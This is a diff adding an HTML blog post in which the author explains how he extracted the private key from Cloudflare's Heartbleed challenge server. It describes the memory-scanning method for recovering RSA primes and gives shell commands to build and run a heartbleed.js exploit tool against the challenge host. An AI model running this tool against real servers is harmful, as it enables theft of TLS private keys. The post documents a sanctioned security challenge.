@@ -1,0 +1,153 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta name=viewport content"width=device-width,initial-scale=1,maximum-scale=10" />
+    
+    <title>Cracking Cloudflare&#x27;s heartbleed challenge</title>
+    
+    <link rel=alternate type="application/rss+xml" href="http://darksi.de/rss.xml" title="Fedor Indutny's blog">
+    <link rel=stylesheet href="/css/main.css" />
+  </head>
+  <body>
+    <aside id=info>
+      <section class=info-title>
+        <a href="/">darksi.de</a>
+        <br/>
+        of
+        </br>
+        Software Engineering
+      </section>
+    
+      <section class=info-copyright>
+        Copyright <a href="https://github.com/indutny">Fedor Indutny</a>,
+        view <a href="http://opensource.org/licenses/mit-license.php">license</a>
+      </section>
+    
+      <section class=info-credits>
+        <i>Icons by: Bluetip Design from the Noun Project</i>
+      </section>
+    </aside>
+    <section id=content>
+      <article class=post>
+        <section class=post-header>
+          <button class=votewdgt title=upvote>?</button>
+          <h1>Cracking Cloudflare&#x27;s heartbleed challenge</h1>
+          <span class=post-header-date>Tue Apr 15 2014 20:00:00 GMT-0400 (Eastern Daylight Time)</span>
+        </section>
+
+        <section class=post-body>
+          <h2 id="challenge">Challenge</h2>
+<p>At April 11th 2014 Cloudflare has published a <a href="http://blog.cloudflare.com/answering-the-critical-question-can-you-get-private-ssl-keys-using-heartbleed">blog post</a> suggesting to
+try out extracting a private key of their specially prepared
+<a href="https://www.cloudflarechallenge.com/heartbleed">challenge site</a> using the <a href="http://heartbleed.com/">Heartbleed</a> OpenSSL vulnerability. Being busy
+at the time, I decided to give it a try a couple of hours later, if noone would
+crack it yet. This was a legal way to do some hackery, after all!</p>
+<h2 id="method">Method</h2>
+<p>The method of attack was following:</p>
+<ol>
+<li>Send a lot of random-sized fake heartbeats (without body)</li>
+<li>Try to find a 128-byte prime factor of the certificate&#39;s <a href="http://en.wikipedia.org/wiki/RSA_(cryptosystem)#Key_generation">modulus</a></li>
+<li>Generate the rest of the private key&#39;s parameters out of it</li>
+</ol>
+<p>I wasn&#39;t searching for a PEM-encoded private key and/or:</p>
+<pre><code>-----BEGIN RSA PRIVATE KEY-----
+</code></pre><p>for a couple of reasons:</p>
+<ul>
+<li>It is loaded only at the process startup</li>
+<li>The key may be encrypted, and there is no point in brute forcing it</li>
+</ul>
+<p>According to my tests, DER-encoded key wasn&#39;t appearing in the memory either, so
+trying to extract primes that are definitely in memory seem more feasible,
+because they are stored in the following struct in OpenSSL:</p>
+<pre><code class="lang-C">struct rsa_st
+  {
+  /* The first parameter is used to pickup errors where
+   * this is passed instead of aEVP_PKEY, it is set to 0 */
+  int pad;
+  long version;
+  const RSA_METHOD *meth;
+  /* functional reference if &#39;meth&#39; is ENGINE-provided */
+  ENGINE *engine;
+  BIGNUM *n;
+  BIGNUM *e;
+  BIGNUM *d;
+  BIGNUM *p;
+  BIGNUM *q;
+  BIGNUM *dmp1;
+  BIGNUM *dmq1;
+  BIGNUM *iqmp;
+  /* be careful using this if the RSA structure is shared */
+  CRYPTO_EX_DATA ex_data;
+  int references;
+  int flags;
+
+  /* Used to cache montgomery values */
+  BN_MONT_CTX *_method_mod_n;
+  BN_MONT_CTX *_method_mod_p;
+  BN_MONT_CTX *_method_mod_q;
+
+  /* all BIGNUM values are actually in the following data, if it is not
+   * NULL */
+  char *bignum_data;
+  BN_BLINDING *blinding;
+  BN_BLINDING *mt_blinding;
+  };
+</code></pre>
+<p>Where <code>BIGNUM</code> is:</p>
+<pre><code class="lang-C">struct bignum_st
+  {
+  BN_ULONG *d;    /* Pointer to an array of &#39;BN_BITS2&#39; bit chunks. */
+  int top;    /* Index of last used d +1. */
+  /* The next are internal book keeping for bn_expand. */
+  int dmax;    /* Size of the d array. */
+  int neg;    /* one if the number is negative */
+  int flags;
+  };
+</code></pre>
+<p>And <code>d</code> field of <code>BIGNUM</code> is a pointer to a little-endian representation of the
+number. Note that I could have been searching for a <code>dmp1</code>, <code>dmpq1</code> or <code>iqmp</code> as
+well, but I was too lame at the time to put this in my tests.</p>
+<h2 id="implementation">Implementation</h2>
+<p>Being a node.js core developer, the platform choice for the extraction script
+was obvious to me. Unfortunately, since node.js is embedding OpenSSL and
+exposing only some limited amount of methods as a JavaScript API, the
+<a href="https://github.com/indutny/heartbleed/blob/master/node-v0.10.26.patch">patch to add fake heartbeat methods</a> was needed. (Update: patch is no longer
+needed, just install module from npm).</p>
+<p>Having this at hand, the implementation was almost straightforward. It is
+available as an <a href="https://github.com/indutny/heartbleed">OpenSource project on github</a> now. Here are instructions for
+obtaining and using it:</p>
+<pre><code class="lang-bash"># Update: patch is no longer needed, just install module from npm
+git clone git://github.com/indutny/heartbleed
+git clone git://github.com/joyent/node -b v0.10.26 node-hb
+cd node-hb
+git apply ../heartbleed/node-v0.10.26.patch
+./configure --prefix=$HOME/.node/0.10.26-hb
+make -j24 install
+ls ./node
+
+export PATH=&quot;$HOME/.node/0.10.26-hb/bin:$PATH&quot;
+
+# Here it goes
+npm install -g heartbleed.js
+
+heartbleed -h cloudflarechallenge.com -c 1000 &gt;&gt; key.pem
+</code></pre>
+<p>Note that it won&#39;t produce any result immediately, it took me 3 hours and a
+certain amount of luck to obtain the key in a Cloudflare&#39;s challenge.</p>
+
+        </section>
+      </article>
+    </section>
+    <script>
+      (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+      (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+      m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+      })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+    
+      ga('create', 'UA-68572164-1', 'auto');
+      ga('send', 'pageview');
+    
+    </script>
+    <script src="https://vote.wdgt.io/cdn/snippet-v2.js" async></script>
+  </body>
+</html>
